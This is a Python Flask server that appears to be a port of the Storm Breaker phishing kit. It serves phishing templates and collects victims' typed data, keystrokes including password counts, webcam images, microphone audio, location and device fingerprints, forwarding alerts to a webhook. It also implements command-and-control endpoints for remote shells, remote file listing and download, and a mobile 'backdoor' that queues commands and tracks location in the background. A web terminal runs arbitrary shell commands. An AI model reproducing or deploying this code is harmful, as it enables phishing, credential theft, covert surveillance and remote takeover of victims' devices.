from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, make_response
import os
import json
import re
import base64
import base64
import subprocess
from datetime import datetime

BASE_DIR = os.path.dirname(__file__)
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
FLASK_TEMPLATES_DIR = os.path.join(BASE_DIR, 'flask_templates')
CHECK_C_PATH = os.path.join(BASE_DIR, 'check-c.json')
PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')

app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), template_folder=FLASK_TEMPLATES_DIR)
app.secret_key = 'storm-breaker-secret-key-v1'
# Disable upload size limit completely
app.config['MAX_CONTENT_LENGTH'] = None


# Keep legacy asset path used by the original PHP templates (../../assets/...)
@app.route('/assets/<path:filename>')
def legacy_assets(filename):
    return send_from_directory(os.path.join(BASE_DIR, 'assets'), filename)


def load_check_c():
    try:
        with open(CHECK_C_PATH, 'r') as f:
            return json.load(f)
    except Exception:
        return {"token": "", "expired": "yes"}


def save_check_c(data):
    with open(CHECK_C_PATH, 'w') as f:
        json.dump(data, f)


def generate_token():
    import uuid
    uniqid = uuid.uuid4().hex
    api_key = '-'.join([uniqid[i:i+5] for i in range(0, len(uniqid), 5)])
    return api_key


def change_token(token):
    key = load_check_c()
    key['token'] = token
    key['expired'] = 'no'
    save_check_c(key)


def load_php_config(path=PHP_CONFIG_PATH):
    # Naive parser for the simple config.php used in this project
    try:
        text = open(path, 'r').read()
    except Exception:
        return {}

    pattern = re.compile(r'"([^\"]+)"\s*=>\s*\[([^\]]+)\]', re.DOTALL)
    users = {}
    for m in pattern.finditer(text):
        username = m.group(1)
        block = m.group(2)
        pwd_m = re.search(r'"password"\s*=>\s*"([^\"]+)"', block)
        if pwd_m:
            users[username] = {'password': pwd_m.group(1)}
    return users


CONFIG = load_php_config()

# Global C2 State (In-memory for simplicity)
C2_SESSIONS = {}
C2_COMMANDS = {}
C2_RESPONSES = {}


@app.route('/')
def index():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        return redirect(url_for('panel'))
    elif session.get('IAm-logined'):
        return redirect(url_for('panel'))
    else:
        return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if session.get('IAm-logined'):
        return redirect(url_for('panel'))

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in CONFIG and CONFIG[username]['password'] == password:
            session['IAm-logined'] = username
            return redirect(url_for('panel'))
        else:
            error = 'Invalid username or password'

    return render_template('login.html', error=error)


@app.route('/panel')
def panel():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        if not session.get('IAm-logined'):
            session['IAm-logined'] = 'yes'
        # Initialize CWD for terminal
        if 'cwd' not in session:
            session['cwd'] = os.getcwd()
    elif session.get('IAm-logined'):
        client_token = generate_token()
        resp = make_response(render_template('panel.html', username=session.get('IAm-logined')))
        resp.set_cookie('logindata', client_token, max_age=86400*30, path='/')
        change_token(client_token)
        return resp
    else:
        return redirect(url_for('login'))

    return render_template('panel.html', username=session.get('IAm-logined'))


@app.route('/mobile_control')
def mobile_control():
    """Mobile C2 Control Panel"""
    if not session.get('IAm-logined'):
        return redirect(url_for('login'))
    return render_template('mobile_control.html')


@app.route('/logout')
def logout():
    session.clear()
    resp = redirect(url_for('login'))
    resp.set_cookie('logindata', '', expires=0, path='/')
    return resp


@app.route('/receiver', methods=['POST'])
def receiver():
    if 'send_me_result' in request.form:
        PATH = os.path.join(BASE_DIR, 'templates')
        out = ''
        # Phishing templates are in subdirectories; exclude Flask template files (*.html, *.json, etc.)
        for name in os.listdir(PATH):
            dirpath = os.path.join(PATH, name)
            if os.path.isdir(dirpath) and not name.startswith('.'):
                result_file = os.path.join(dirpath, 'result.txt')
                if os.path.exists(result_file):
                    try:
                        data = open(result_file, 'r', encoding='utf-8', errors='ignore').read()
                        if data.strip():
                            out += data + "\n"
                            open(result_file, 'w').close()
                    except Exception:
                        pass
        return out
    return ''


@app.route('/list_templates')
def list_templates():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files like login.html, panel.html)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)


@app.route('/api/images')
def get_images():
    """API endpoint to list all captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    os.makedirs(images_dir, exist_ok=True)
    
    try:
        files = os.listdir(images_dir)
        images = []
        for f in files:
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                file_path = os.path.join(images_dir, f)
                images.append({
                    'name': f,
                    'url': f'/images/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        images.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'images': images})
    except Exception as e:
        return jsonify({'error': str(e), 'images': []}), 500


@app.route('/api/audio')
def get_audio():
    """API endpoint to list all recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    os.makedirs(sounds_dir, exist_ok=True)
    
    try:
        files = os.listdir(sounds_dir)
        audio_files = []
        for f in files:
            if f.lower().endswith(('.wav', '.mp3', '.m4a', '.ogg', '.webm')):
                file_path = os.path.join(sounds_dir, f)
                audio_files.append({
                    'name': f,
                    'url': f'/sounds/{f}',
                    'timestamp': os.path.getmtime(file_path)
                })
        # Sort by timestamp descending (newest first)
        audio_files.sort(key=lambda x: x['timestamp'], reverse=True)
        return jsonify({'audio': audio_files})
    except Exception as e:
        return jsonify({'error': str(e), 'audio': []}), 500


@app.route('/images/<filename>')
def serve_image(filename):
    """Serve captured images"""
    images_dir = os.path.join(BASE_DIR, 'images')
    return send_from_directory(images_dir, filename)


@app.route('/sounds/<filename>')
def serve_sound(filename):
    """Serve recorded audio files"""
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    return send_from_directory(sounds_dir, filename)


# Compatibility routes for original PHP filenames (avoid 404s from existing JS)
@app.route('/list_templates.php', methods=['GET', 'POST'])
def list_templates_php():
    PATH = os.path.join(BASE_DIR, 'templates')
    # Only return directories that are phishing templates (not Flask template files)
    files = [f for f in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, f)) and not f.startswith('.')]
    return json.dumps(files)


@app.route('/receiver.php', methods=['POST'])
def receiver_php():
    return receiver()


@app.route('/logout.php')
def logout_php():
    return logout()


@app.route('/index.php')
def index_php():
    return index()


@app.route('/login.php', methods=['GET', 'POST'])
def login_php():
    return login()


@app.route('/panel.php')
def panel_php():
    return panel()


@app.route('/t/<name>/post.php', methods=['POST'])
def template_post_php(name):
    return template_post(name)


@app.route('/t/<name>/handler.php', methods=['POST'])
def template_handler_php(name):
    return template_handler(name)


@app.route('/api/images.php')
def get_images_php():
    return get_images()


@app.route('/api/audio.php')
def get_audio_php():
    return get_audio()


@app.route('/api/delete_images', methods=['POST'])
def delete_images():
    images_dir = os.path.join(BASE_DIR, 'images')
    if os.path.exists(images_dir):
        for f in os.listdir(images_dir):
            file_path = os.path.join(images_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'


@app.route('/api/delete_audio', methods=['POST'])
def delete_audio():
    sounds_dir = os.path.join(BASE_DIR, 'sounds')
    if os.path.exists(sounds_dir):
        for f in os.listdir(sounds_dir):
            file_path = os.path.join(sounds_dir, f)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception:
                pass
    return 'OK'


@app.route('/api/delete_images.php', methods=['POST'])
def delete_images_php():
    return delete_images()


@app.route('/api/delete_audio.php', methods=['POST'])
def delete_audio_php():
    return delete_audio()


@app.route('/t/<name>/')
def serve_template_index(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if os.path.isdir(dirpath):
        return send_from_directory(dirpath, 'index.html')
    return 'Not found', 404


def send_notification(message_data):
    try:
        if os.path.exists('Settings.json'):
            with open('Settings.json', 'r') as f:
                settings = json.load(f)
                webhook_url = settings.get('generic_webhook')
                if webhook_url:
                    import requests
                    # Send as JSON to be compatible with Zapier/Make
                    requests.post(webhook_url, json=message_data)
    except Exception:
        pass


@app.route('/api/save_settings', methods=['POST'])
def save_settings():
    try:
        data = request.json
        settings = {}
        if os.path.exists('Settings.json'):
            with open('Settings.json', 'r') as f:
                settings = json.load(f)
        
        settings.update(data)
        
        with open('Settings.json', 'w') as f:
            json.dump(settings, f)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api/get_settings')
def get_settings():
    if os.path.exists('Settings.json'):
        with open('Settings.json', 'r') as f:
            return jsonify(json.load(f))
    return jsonify({})


@app.route('/t/<name>/<path:filename>', methods=['GET', 'POST'])
def serve_template_file(name, filename):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404

    # Handle PHP file POSTs (catch-all for capture.php, result.php, etc.)
    if filename.endswith('.php'):
        if request.method == 'POST':
            if 'upload' in filename:
                return template_upload_php(name)
            return template_post(name)
        # Don't serve PHP source code
        return 'OK'

    return send_from_directory(dirpath, filename)


@app.route('/t/<name>/handler', methods=['POST'])
def template_handler(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404
    data = request.form.get('data')
    if data is None:
        return 'No data', 400
    
    # Send notification
    if "Google Map Link" in data:
        send_notification({
            "type": "Location Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
    else:
        send_notification({
            "type": "Data Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })

    result_file = os.path.join(dirpath, 'result.txt')
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write(data)
    return 'OK'


@app.route('/t/<name>/post', methods=['POST'])
def template_post(name):
    dirpath = os.path.join(TEMPLATES_DIR, name)
    if not os.path.isdir(dirpath):
        return 'Not found', 404

    # 1. Handle Image Uploads (base64)
    # 'cat' is used by camera_temp, 'image' by job_application
    img_data = request.form.get('cat') or request.form.get('image')
    
    if img_data:
        try:
            # Clean up headers if present (data:image/png;base64,)
            if ',' in img_data:
                img_data = img_data.split(',')[1]
            
            # Handle space to plus conversion for base64
            img_data = img_data.replace(' ', '+')
            
            decoded_data = base64.b64decode(img_data)
            fname = 'cam' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.png'
            images_dir = os.path.join(BASE_DIR, 'images')
            os.makedirs(images_dir, exist_ok=True)
            imgpath = os.path.join(images_dir, fname)
            with open(imgpath, 'wb') as f:
                f.write(decoded_data)
            
            # write to result.txt
            result_file = os.path.join(dirpath, 'result.txt')
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write('Image File Was Saved ! > /images/' + fname)
            
            send_notification({
                "type": "Image Captured",
                "filename": fname,
                "template": name,
                "timestamp": datetime.now().isoformat()
            })
            return 'OK'
        except Exception as e:
            print(f"Image Save Error: {e}")
            return 'Error: ' + str(e), 500

    # 2. Handle Text Data
    # If 'data' exists (standard templates), use it.
    # Otherwise, collect ALL form fields (job_application, etc.)
    data = request.form.get('data')
    
    if not data and len(request.form) > 0:
        # Construct specific formatted data string from all fields
        lines = []
        for key, value in request.form.items():
            if key not in ['cat', 'image']:
                lines.append(f"{key}: {value}")
        data = "\n".join(lines)

    if data:
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(data)
        send_notification({
            "type": "Data Captured",
            "content": data,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
        return 'OK'

    return 'No data', 400


@app.route('/t/<name>/upload.php', methods=['POST'])
def template_upload_php(name):
    # Generic file handler - take the first file found
    if not request.files:
        return 'No file part', 400
    
    # Get the first file uploaded, regardless of the key ('audio_data', 'audio_file', etc.)
    file = next(iter(request.files.values()))
    
    if file.filename == '':
        return 'No selected file', 400
        
    if file:
        filename = file.filename
        # Ensure extension
        if not filename.endswith('.wav'):
            filename += '.wav'
            
        sounds_dir = os.path.join(BASE_DIR, 'sounds')
        os.makedirs(sounds_dir, exist_ok=True)
        save_path = os.path.join(sounds_dir, filename)
        file.save(save_path)
        
        # Write to result.txt
        dirpath = os.path.join(TEMPLATES_DIR, name)
        result_file = os.path.join(dirpath, 'result.txt')
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"Audio File Was Saved ! > /sounds/{filename}")
            
        send_notification({
            "type": "Audio Captured",
            "filename": filename,
            "template": name,
            "timestamp": datetime.now().isoformat()
        })
        return 'OK'
    return 'Error', 500


# ===== ADVANCED FEATURES API ENDPOINTS =====

@app.route('/api/fingerprint', methods=['POST'])
def save_fingerprint():
    """Save device fingerprint data"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        # Create fingerprints directory
        fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
        os.makedirs(fingerprints_dir, exist_ok=True)

        # Save fingerprint with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        fingerprint_hash = data.get('hash', 'unknown')
        filename = f'fingerprint_{timestamp}_{fingerprint_hash[:8]}.json'
        filepath = os.path.join(fingerprints_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        # Send notification
        send_notification({
            "type": "Device Fingerprint Captured",
            "hash": fingerprint_hash,
            "browser": data.get('basic', {}).get('userAgent', 'Unknown'),
            "timestamp": datetime.now().isoformat()
        })

        return jsonify({'status': 'success', 'hash': fingerprint_hash})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/keystrokes', methods=['POST'])
def save_keystrokes():
    """Save keystroke logs"""
    try:
        data = request.json
        if not data or 'logs' not in data:
            return jsonify({'error': 'No logs provided'}), 400

        # Create keystrokes directory
        keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
        os.makedirs(keystrokes_dir, exist_ok=True)

        # Save keystrokes with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'keystrokes_{timestamp}.json'
        filepath = os.path.join(keystrokes_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        # Count sensitive data
        logs = data.get('logs', [])
        password_count = sum(1 for log in logs if log.get('target', {}).get('type') == 'password')
        form_submit_count = sum(1 for log in logs if log.get('type') == 'submit')

        # Send notification if sensitive data captured
        if password_count > 0 or form_submit_count > 0:
            send_notification({
                "type": "Keystrokes Captured",
                "logs_count": len(logs),
                "passwords": password_count,
                "form_submits": form_submit_count,
                "url": data.get('url', 'Unknown'),
                "timestamp": datetime.now().isoformat()
            })

        return jsonify({'status': 'success', 'count': len(logs)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/start', methods=['POST'])
def session_start():
    """Handle session recording start"""
    try:
        data = request.json
        if not data or 'sessionId' not in data:
            return jsonify({'error': 'No session ID provided'}), 400

        # Create sessions directory
        sessions_dir = os.path.join(BASE_DIR, 'sessions')
        os.makedirs(sessions_dir, exist_ok=True)

        # Create session metadata file
        session_id = data.get('sessionId')
        filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        # Send notification
        send_notification({
            "type": "Session Recording Started",
            "sessionId": session_id,
            "url": data.get('url', 'Unknown'),
            "timestamp": datetime.now().isoformat()
        })

        return jsonify({'status': 'success', 'sessionId': session_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/events', methods=['POST'])
def session_events():
    """Handle session recording events"""
    try:
        data = request.json
        if not data or 'sessionId' not in data or 'events' not in data:
            return jsonify({'error': 'Invalid data'}), 400

        # Create sessions directory
        sessions_dir = os.path.join(BASE_DIR, 'sessions')
        os.makedirs(sessions_dir, exist_ok=True)

        # Append events to session file
        session_id = data.get('sessionId')
        filepath = os.path.join(sessions_dir, f'{session_id}_events.jsonl')

        # Append events as JSON lines
        with open(filepath, 'a') as f:
            for event in data.get('events', []):
                f.write(json.dumps(event) + '\n')

        return jsonify({'status': 'success', 'count': len(data.get('events', []))})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/end', methods=['POST'])
def session_end():
    """Handle session recording end"""
    try:
        data = request.json
        if not data or 'sessionId' not in data:
            return jsonify({'error': 'No session ID provided'}), 400

        session_id = data.get('sessionId')
        
        # Update session metadata with end time
        sessions_dir = os.path.join(BASE_DIR, 'sessions')
        meta_filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')

        if os.path.exists(meta_filepath):
            with open(meta_filepath, 'r') as f:
                meta = json.load(f)
            
            meta['endTime'] = data.get('timestamp')
            meta['duration'] = data.get('duration', 0)

            with open(meta_filepath, 'w') as f:
                json.dump(meta, f, indent=2)

        # Send notification
        send_notification({
            "type": "Session Recording Ended",
            "sessionId": session_id,
            "duration": data.get('duration', 0),
            "timestamp": datetime.now().isoformat()
        })

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/terminal', methods=['POST'])
def terminal_exec():
    """Handle terminal commands execution"""
    try:
        if not session.get('IAm-logined'):
            return jsonify({'error': 'Unauthorized', 'output': 'Unauthorized access'}), 401

        data = request.json
        cmd = data.get('cmd', '').strip()
        
        # Get current working directory from session or default
        cwd = session.get('cwd', os.getcwd())
        
        # Verify CWD exists, if not reset to default
        if not os.path.exists(cwd):
            cwd = os.getcwd()
            session['cwd'] = cwd

        if not cmd:
            return jsonify({'output': '', 'cwd': cwd})

        # Handle Directory Changes (cd)
        if cmd.startswith('cd '):
            new_dir_part = cmd[3:].strip()
            # Handle "cd" (home) or "cd ~"
            if not new_dir_part or new_dir_part == '~':
                new_path = os.path.expanduser('~')
            else:
                new_path = os.path.join(cwd, new_dir_part)
            
            # Resolve relative paths (..)
            new_path = os.path.abspath(new_path)
            
            if os.path.isdir(new_path):
                session['cwd'] = new_path
                return jsonify({'output': '', 'cwd': new_path})
            else:
                return jsonify({'output': f"cd: {new_dir_part}: No such file or directory", 'cwd': cwd})

        # Process standard commands
        try:
            # Use specific shell based on OS
            shell_cmd = cmd
            if os.name == 'nt':
                # Windows: we might want to capture stderr too
                # Using shell=True for internal commands like dir, echo
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True)
            else:
                completion = subprocess.run(shell_cmd, cwd=cwd, shell=True, capture_output=True, text=True, executable='/bin/bash')
            
            output = completion.stdout
            if completion.stderr:
                output += "\n" + completion.stderr
                
            return jsonify({'output': output, 'cwd': cwd})
            
        except Exception as e:
            return jsonify({'output': str(e), 'cwd': cwd})
            
    except Exception as e:
        return jsonify({'error': str(e), 'output': f"Server Error: {str(e)}"}), 500


# ===== C2 / REMOTE SHELL ENDPOINTS =====

@app.route('/api/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})
    
    C2_SESSIONS[uid] = {
        'last_seen': datetime.now().isoformat(),
        'info': info,
        'ip': request.remote_addr
    }
    
    # Initialize queues if new
    if uid not in C2_COMMANDS:
        C2_COMMANDS[uid] = []
    if uid not in C2_RESPONSES:
        C2_RESPONSES[uid] = []
        
    return jsonify({'status': 'registered'})

@app.route('/api/c2/poll', methods=['POST'])
def c2_poll():
    data = request.json
    uid = data.get('uid')
    
    if uid in C2_SESSIONS:
        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
        
    # Check for commands
    if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
        cmd = C2_COMMANDS[uid].pop(0)
        return jsonify({'command': cmd})
        
    return jsonify({'command': None})

@app.route('/api/c2/response', methods=['POST'])
def c2_response():
    data = request.json
    uid = data.get('uid')
    output = data.get('output')
    
    if uid in C2_SESSIONS:
        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
    
    if uid not in C2_RESPONSES:
        C2_RESPONSES[uid] = []
        
    C2_RESPONSES[uid].append({
        'timestamp': datetime.now().isoformat(),
        'output': output
    })
    
    return jsonify({'status': 'received'})

# Admin APIs for Dashboard
@app.route('/api/c2/clients')
def c2_list_clients():
    # Filter active clients (seen in last 60 seconds)
    active = []
    now = datetime.now()
    for uid, sess in C2_SESSIONS.items():
        # Calculate time diff
        try:
            last = datetime.fromisoformat(sess['last_seen'])
            delta = (now - last).total_seconds()
            status = 'online' if delta < 20 else 'offline'
        except:
            status = 'offline'
            
        active.append({
            'uid': uid,
            'ip': sess['ip'],
            'info': sess['info'],
            'status': status,
            'last_seen': sess['last_seen']
        })
    return jsonify({'clients': active})

@app.route('/api/c2/queue_command', methods=['POST'])
def c2_queue_command():
    data = request.json
    uid = data.get('uid')
    cmd = data.get('cmd')
    
    if uid not in C2_COMMANDS:
        C2_COMMANDS[uid] = []
        
    C2_COMMANDS[uid].append(cmd)
    return jsonify({'status': 'queued'})

@app.route('/api/c2/get_responses/<uid>')
def c2_get_responses(uid):
    if uid in C2_RESPONSES:
        resps = C2_RESPONSES[uid]
        # Clear after reading to act like a stream
        C2_RESPONSES[uid] = []
        return jsonify({'responses': resps})
    return jsonify({'responses': []})

# File Manager Endpoints
C2_FILE_LISTS = {}
C2_DOWNLOADS = {}

@app.route('/api/c2/get_file_list/<uid>')
def c2_get_file_list(uid):
    if uid in C2_FILE_LISTS:
        file_data = C2_FILE_LISTS[uid]
        # Clear after reading
        del C2_FILE_LISTS[uid]
        return jsonify(file_data)
    return jsonify({'files': None})

@app.route('/api/c2/get_download/<uid>')
def c2_get_download(uid):
    if uid in C2_DOWNLOADS:
        file_data = C2_DOWNLOADS[uid]
        # Clear after reading
        del C2_DOWNLOADS[uid]
        return jsonify(file_data)
    return jsonify({'file': None})

@app.route('/api/c2/file_list_response', methods=['POST'])
def c2_file_list_response():
    """Victim sends file list back"""
    data = request.json
    uid = data.get('uid')
    files = data.get('files')
    path = data.get('path')
    
    if uid:
        C2_FILE_LISTS[uid] = {
            'files': files,
            'path': path
        }
    
    return jsonify({'status': 'received'})

@app.route('/api/c2/file_download_response', methods=['POST'])
def c2_file_download_response():
    """Victim sends file content back"""
    data = request.json
    uid = data.get('uid')
    content = data.get('content')
    filename = data.get('filename')
    
    if uid:
        C2_DOWNLOADS[uid] = {
            'file': {
                'content': content,
                'filename': filename
            }
        }
    
    return jsonify({'status': 'received'})


# ===== MOBILE BACKDOOR ENDPOINTS =====

# Import database for persistence
import database as db

# Global Mobile State
MOBILE_SESSIONS = {}
MOBILE_COMMANDS = {}
MOBILE_RESPONSES = {}
MOBILE_CAMERA_IMAGES = {}

@app.route('/api/mobile/register', methods=['POST'])
def mobile_register():
    """Register a new mobile client"""
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})
    
    # Save to DATABASE (PERSISTENT - survives restart!)
    db.save_mobile_session(uid, info, request.remote_addr)
    
    # Also keep in memory for current session
    MOBILE_SESSIONS[uid] = {
        'last_seen': datetime.now().isoformat(),
        'info': info,
        'ip': request.remote_addr,
        'registered_at': datetime.now().isoformat()
    }
    
    # Initialize queues if new
    if uid not in MOBILE_COMMANDS:
        MOBILE_COMMANDS[uid] = []
    if uid not in MOBILE_RESPONSES:
        MOBILE_RESPONSES[uid] = []
    
    # Send notification
    send_notification({
        "type": "Mobile Device Connected",
        "uid": uid,
        "platform": info.get('platform', 'Unknown'),
        "userAgent": info.get('userAgent', 'Unknown'),
        "timestamp": datetime.now().isoformat()
    })
    
    return jsonify({'status': 'registered'})

@app.route('/api/mobile/poll', methods=['POST'])
def mobile_poll():
    """Mobile client polls for commands"""
    data = request.json
    uid = data.get('uid')
    
    # Update last seen in DATABASE
    db.update_mobile_last_seen(uid)
    
    if uid in MOBILE_SESSIONS:
        MOBILE_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
    
    # Check for commands
    if uid in MOBILE_COMMANDS and len(MOBILE_COMMANDS[uid]) > 0:
        cmd = MOBILE_COMMANDS[uid].pop(0)
        return jsonify({'command': cmd})
    
    return jsonify({'command': None})

@app.route('/api/mobile/response', methods=['POST'])
def mobile_response():
    """Mobile client sends command response"""
    data = request.json
    uid = data.get('uid')
    output = data.get('output')
    
    if uid:
        if uid not in MOBILE_RESPONSES:
            MOBILE_RESPONSES[uid] = []
        MOBILE_RESPONSES[uid].append({
            'output': output,
            'timestamp': datetime.now().isoformat()
        })
    
    return jsonify({'status': 'received'})

@app.route('/api/mobile/camera', methods=['POST'])
def mobile_camera():
    """Mobile client sends camera capture"""
    data = request.json
    uid = data.get('uid')
    image_data = data.get('image')
    
    if uid and image_data:
        try:
            # Clean up headers if present
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            
            decoded_data = base64.b64decode(image_data)
            fname = 'mobile_' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.jpg'
            images_dir = os.path.join(BASE_DIR, 'images')
            os.makedirs(images_dir, exist_ok=True)
            imgpath = os.path.join(images_dir, fname)
            
            with open(imgpath, 'wb') as f:
                f.write(decoded_data)
            
            # Store reference
            MOBILE_CAMERA_IMAGES[uid] = fname
            
            # Send notification
            send_notification({
                "type": "Mobile Camera Capture",
                "uid": uid,
                "filename": fname,
                "timestamp": datetime.now().isoformat()
            })
            
            return jsonify({'status': 'saved', 'filename': fname})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Invalid data'}), 400

@app.route('/api/mobile/clients', methods=['GET'])
def mobile_clients():
    """Get list of connected mobile clients - LOADS FROM DATABASE!"""
    clients = []
    now = datetime.now()
    
    # Load ALL sessions from database (PERSISTENT)
    all_sessions = db.get_all_mobile_sessions()
    
    # Merge with in-memory sessions
    for uid, db_session in all_sessions.items():
        # Update in-memory cache
        if uid not in MOBILE_SESSIONS:
            MOBILE_SESSIONS[uid] = db_session
    
    # Now check which are active
    for uid, session in MOBILE_SESSIONS.items():
        try:
            last_seen = datetime.fromisoformat(session['last_seen'])
            seconds_ago = (now - last_seen).total_seconds()
            
            # Show all sessions from last 24 hours (not just 60 seconds)
            if seconds_ago < 86400:  # 24 hours
                clients.append({
                    'uid': uid,
                    'info': session['info'],
                    'ip': session['ip'],
                    'last_seen': session['last_seen'],
                    'seconds_ago': int(seconds_ago),
                    'status': 'online' if seconds_ago < 60 else 'offline'
                })
        except:
            pass
    
    return jsonify({'clients': clients})

@app.route('/api/mobile/send_command', methods=['POST'])
def mobile_send_command():
    """Send command to mobile client"""
    data = request.json
    uid = data.get('uid')
    command = data.get('command')
    
    if uid and command:
        if uid not in MOBILE_COMMANDS:
            MOBILE_COMMANDS[uid] = []
        MOBILE_COMMANDS[uid].append(command)
        return jsonify({'status': 'queued'})
    
    return jsonify({'error': 'Invalid data'}), 400

@app.route('/api/mobile/get_response/<uid>', methods=['GET'])
def mobile_get_response(uid):
    """Get latest response from mobile client"""
    if uid in MOBILE_RESPONSES and len(MOBILE_RESPONSES[uid]) > 0:
        response = MOBILE_RESPONSES[uid].pop(0)
        return jsonify(response)
    
    return jsonify({'output': None})


# Global tracking data storage
MOBILE_TRACKING_DATA = {}

@app.route('/api/mobile/background_data', methods=['POST'])
def mobile_background_data():
    """Receive background tracking data from mobile client"""
    data = request.json
    uid = data.get('uid')
    tracking_data = data.get('data')
    
    if uid and tracking_data:
        if uid not in MOBILE_TRACKING_DATA:
            MOBILE_TRACKING_DATA[uid] = []
        
        # Store tracking data with timestamp
        tracking_data['received_at'] = datetime.now().isoformat()
        MOBILE_TRACKING_DATA[uid].append(tracking_data)
        
        # Keep only last 100 entries per device
        if len(MOBILE_TRACKING_DATA[uid]) > 100:
            MOBILE_TRACKING_DATA[uid] = MOBILE_TRACKING_DATA[uid][-100:]
        
        # Send notification for important events
        if tracking_data.get('type') == 'background_location':
            send_notification({
                "type": "Mobile Location Update",
                "uid": uid,
                "latitude": tracking_data.get('latitude'),
                "longitude": tracking_data.get('longitude'),
                "timestamp": tracking_data.get('timestamp')
            })
        
        return jsonify({'status': 'received'})
    
    return jsonify({'error': 'Invalid data'}), 400

@app.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
def mobile_get_tracking_data(uid):
    """Get tracking data for a specific mobile client"""
    if uid in MOBILE_TRACKING_DATA:
        return jsonify({'data': MOBILE_TRACKING_DATA[uid]})
    
    return jsonify({'data': []})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=2525, debug=True)
